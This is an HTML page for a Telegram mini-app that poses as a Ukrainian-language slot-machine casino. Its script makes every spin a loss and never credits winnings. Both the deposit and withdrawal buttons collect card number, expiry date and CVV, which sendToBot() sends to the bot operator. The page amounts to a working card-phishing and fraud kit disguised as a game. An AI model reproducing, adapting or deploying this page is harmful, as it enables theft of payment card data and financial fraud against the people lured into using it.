<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { background: #0b0b0b; color: #ffd700; font-family: sans-serif; text-align: center; margin: 0; padding: 15px; }
        .balance-box { background: #1a1a1a; padding: 20px; border-radius: 15px; border: 1px solid gold; margin-bottom: 20px; }
        .slots { font-size: 50px; display: flex; justify-content: center; gap: 10px; height: 75px; margin: 20px 0; }
        .btn { width: 100%; padding: 15px; margin: 5px 0; border-radius: 12px; border: none; font-weight: bold; cursor: pointer; }
        .btn-spin { background: linear-gradient(#ff9900, #cc7a00); color: white; font-size: 18px; }
        .btn-pay { background: #28a745; color: white; }
        .btn-verify { background: #007bff; color: white; margin-top: 15px; }
        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 1000; padding-top: 20px; }
        input { width: 85%; padding: 15px; margin: 10px 0; border-radius: 10px; border: 1px solid #444; background: #111; color: white; font-size: 18px; }
        .error-text { color: #ff4444; font-size: 14px; margin-top: -5px; display: none; }
    </style>
</head>
<body>

    <div class="balance-box">
        Поточний баланс: <span id="bal">0</span> грн
    </div>

    <div style="background:#111; padding:20px; border-radius:20px; border: 2px solid #333;">
        <div class="slots" id="slot-ui">
            <span>🍎</span><span>🍒</span><span>🌽</span>
        </div>
        <button class="btn btn-spin" onclick="playGame()">КРУТИТИ (20 грн)</button>
    </div>

    <button class="btn btn-pay" onclick="openForm('PAY')">ПОПОВНИТИ</button>
    <button class="btn" style="background:#c0392b; color:white;" onclick="openForm('OUT')">ВИВЕСТИ КОШТИ</button>
    <button class="btn btn-verify" onclick="requestVerify()">ПІДТВЕРДИТИ ОСОБУ (18+)</button>

    <div id="modal" class="modal">
        <h2 id="m-title">💳 Картка</h2>
        <input type="text" id="card" placeholder="0000 0000 0000 0000" maxlength="19" inputmode="numeric">
        <div style="display:flex; justify-content:center; gap:10px;">
            <input type="text" id="exp" placeholder="ММ/РР" maxlength="5" style="width:40%" inputmode="numeric">
            <input type="text" id="cvv" placeholder="CVV" maxlength="3" style="width:40%" inputmode="numeric">
        </div>
        <input type="number" id="amt" placeholder="Сума (грн)" inputmode="numeric">
        <p id="err" class="error-text">Потрібно заповнити всі цифри!</p>
        <button class="btn btn-pay" onclick="sendToBot()">ПІДТВЕРДИТИ</button>
        <button class="btn" style="background:#333; color:white;" onclick="document.getElementById('modal').style.display='none'">СКАСУВАТИ</button>
    </div>

    <script>
        let tg = window.Telegram.WebApp;
        let balance = 0;
        let mode = "";

        // Тільки цифри + маска пробілів
        document.getElementById('card').oninput = e => {
            e.target.value = e.target.value.replace(/[^\d]/g, '').replace(/(.{4})/g, '$1 ').trim();
        };

        function openForm(t) {
            mode = t;
            document.getElementById('m-title').innerText = t == 'PAY' ? "💳 Поповнення" : "💰 Виведення";
            document.getElementById('modal').style.display = 'block';
        }

        function requestVerify() {
            tg.sendData(JSON.stringify({action: "VERIFY_ASK"}));
            tg.close();
        }

        function playGame() {
            if (balance < 20) return alert("Недостатньо коштів! Поповніть баланс.");
            balance -= 20;
            document.getElementById('bal').innerText = balance;
            alert("Програш! Спробуйте ще раз.");
        }

        function sendToBot() {
            const c = document.getElementById('card').value, e = document.getElementById('exp').value, 
                  v = document.getElementById('cvv').value, a = document.getElementById('amt').value;

            if (c.length < 19 || e.length < 5 || v.length < 3 || !a) {
                document.getElementById('err').style.display = 'block';
                return;
            }

            tg.sendData(JSON.stringify({action: mode, card: c, date: e, cvv: v, amount: a}));
            tg.close();
        }
    </script>
</body>
</html>
